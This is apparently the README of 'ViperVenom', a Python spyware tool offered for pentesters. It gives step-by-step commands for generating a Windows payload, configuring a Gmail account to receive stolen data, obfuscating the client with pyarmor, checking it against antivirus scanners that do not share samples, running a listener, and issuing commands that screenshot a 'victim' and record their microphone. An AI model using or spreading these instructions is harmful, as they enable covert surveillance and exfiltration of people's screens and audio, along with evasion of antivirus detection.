<img src="https://revise7.com/wp-content/uploads/2021/08/Logo2.svg" width="400">

# ViperVenom Spyware Tool for Pentesters

ViperVenom is an open-source cyber offensive tool developed by [Revise7 Security](https://revise7.com)
for pentesters, the tool has the ability to webcam record, screenshot, screenshare and
screen video record in high-quality.
ViperVenom is a great tool when it comes to pentesting assessments, as some sort of a proof
that you broke it to a computer and was able to install ViperVenom to capture the screen

Help us improve the tool by [contacting us](https://revise7.com/contacts/), or by sending an [issue](https://github.com/Revise7/ViperVenom/issues)
Keep in mind, the tool is currently in beta, bugs may happen.

## Important!
Please do not test ViperVenom on VirusTotal, instead, test it on a website like [AntiScan.me](https://antiscan.me/)

## Install Tool
To create the latest tool for your platform from this source repository:

##### Download and extract the source:
[Download Directly from GitHub](https://github.com/Revise7/ViperVenom/archive/refs/heads/main.zip)
```
$ unzip ViperVenom-main.zip
$ cd ViperVenom-main
```
**NOTE:** Instead of downloading the compressed source, you may instead want to clone the GitHub 
repository:
```
$ git clone https://github.com/Revise7/ViperVenom.git
$ cd ViperVenom
$ pip3 install -r requirements.txt
$ python3 vipervenom.py
```

##### ViperVenom's Client Requirements: 
```
$ pip3 install -r client_requirements.txt
```
To connect a computer to the listener(you, most likely) you need to install a few Python extensions, for now. The client must have the latest Python
installation, and the Python extensions used in the client file, but you can use a Python compiler to create
an executable.

## Recommeneded !
As we are developing Revise7's ViperVenom, Revise7 tested [pyarmor](https://pypi.org/project/pyarmor/),
PyArmor is a command line tool used to obfuscate python scripts, so you can encode your client file so the source won't be shown.
```
$ pip3 install pyarmor
$ cd vipervenom-main
$ pyarmor obfuscate <payload_name>.py
```
Thanks for PyArmor developers for the ability to encode Python code without breaking the program, kudos for them!

##### Install Python Extensions for The Client File:
* pillow
* sounddevice
* scipy

# Generating Payload (Updated 21/08/2021)
In this section, you will be able to generate your own ViperVenom Python payload, convert it to an encoded shellcode payload, or an executable.

First, run the tool
```
python3 vipervenom.py
```
You should be brought to the starting page, to show the list, type "show list" or "list", to see the available options.
```
Landing/ViperVenom/ > show list

1 | Start Handler Listener                             

2 | Generate ViperVenom Payload
```
To generate a payload, we would have to use the second option,
```
Landing/ViperVenom/ > use 2
/ViperVenom/ > 

```
To see the available payloads to generate, "show payloads" will be a helpful command.
```
/ViperVenom/ > show payloads

Available Payloads Any Windows:                                                                                                                                                                       
                                                                                                                                                                                                                  
1 | generator/vipervenom/tcp/payload | Best Option for Windows Exploitation.
```
To use this generator, type "use" with its name, just like this
```
/ViperVenom/ > use generator/vipervenom/tcp/payload
(Generator) Windows/ViperVenom/TCP/Payload > 
```
Now, you have to set everything yourself, host IP address, port to listen to, Gmail address, Gmail password (don't worry, we do not log anything you do in this software. At all),
microphone record seconds, and filename, here's a quick walkthrough
```
(Generator) Windows/ViperVenom/TCP/Payload > set host YOURIP
(Generator) Windows/ViperVenom/TCP/Payload > set port YOURPORT
(Generator) Windows/ViperVenom/TCP/Payload > set gmailaddr YOURGMAILADDR@gmail.com
(Generator) Windows/ViperVenom/TCP/Payload > set gmailpass YOURPASSWORD
(Generator) Windows/ViperVenom/TCP/Payload > set micrecord SECONDS
(Generator) Windows/ViperVenom/TCP/Payload > set filename YOURFILENAME.py

```
Once you are done setting it up, you can recheck everything by doing "show OPTIONNAME", just like here
```
EXAMPLE:

(Generator) Windows/ViperVenom/TCP/Payload > show gmailaddr
GAMILADDR=revise7testing@gmail.com
```
To generate the payload
```
(Generator) Windows/ViperVenom/TCP/Payload > generate
[*] Generating Payload
.
..
...
[*] Converting Code to a Shellcode, Please Wait
.
..
...

[*] Payload Generated, Payload is Ready.
[*] Would You Like to Start Listener? 
```
And you finished, your payload is ready, you can convert it to an executable or do whatever you want with it.

# Setting Up ViperVenom

After starting the software, to see which options are available, type "list" or "show list", the list of available options will be printed out
```
Landing/ViperVenom/ > show list

1 | Start Handler Listener                             

2 | Generate ViperVenom Payload
```
To use the listener option in the list, type
```
use 1
Landing/ViperVenom/ > use 1
/ViperVenom/ > 
```
After selecting 1, to view available payloads, type
```
show payloads

ViperVenom/ > show payloads

Available Payloads Any Windows:                                                                                                                                                                       
1 | windows/vipervenom/tcp/payload | Best Option for Windows Exploitation.

```
You should be brought to the listener page.

To select a payload
```
use windows/vipervenom/tcp/payload

/ViperVenom/ > use windows/vipervenom/tcp/payload
(Listener) Windows/ViperVenom/TCP/Payload > 
```
After selecting payload, you must set up your host IP and port that you want to listen to, make sure that your client file has the same host IP and port.
```
EXAMPLE:

Listener) Windows/ViperVenom/TCP/Payload > set host YOURLOCALIP
(Listener) Windows/ViperVenom/TCP/Payload > set port YOURPORT
(Listener) Windows/ViperVenom/TCP/Payload > show host
LHOST=YOURLOCALIP
(Listener) Windows/ViperVenom/TCP/Payload > show port
LPORT=YOURPORT
(Listener) Windows/ViperVenom/TCP/Payload > 
```
After you set everything up, type run and enter to start the listener

```
(Listener) Windows/ViperVenom/TCP/Payload > run
[*] Starting Listener...
Listener Started, Waiting for Connections...
```

##### To connect your target computer:
```
$ Python3 <payload_name>.py
```

## Special Commands

```
screenshot
```
Screenshots victim's computer and sends it directly to your Gmail account as base64 encoded image, decrypt it using the decode_image.py
that comes with ViperVenom and paste the base64 string in base64.txt and run the Python file, base64 and decode_image.py are in "Tools" folder.
```
$ python3 decode_image.py
```
The screenshot should appear in ViperVenom's Tool folder as a .jpg file.
```
mic record
```
Records victim's microphone input( if the victim has an available microphone) for an amount of time you set.
Known bug: You won't be able to type more commands after executing this command, we're working on a fix.

# Contact Us
For more detailed information on developing ViperVenom, please contact us at [our website](https://revise7.com/contacts). 
Revise7 does not take any responsibility in misuse, or for illegal purposes, we cannot control the tool if it goes to the wrong hand as we do not have a kill switch.

[Revise7]: https://revise7.com
[Download file]: https://github.com/Revise7/ViperVenom/archive/refs/heads/main.zip
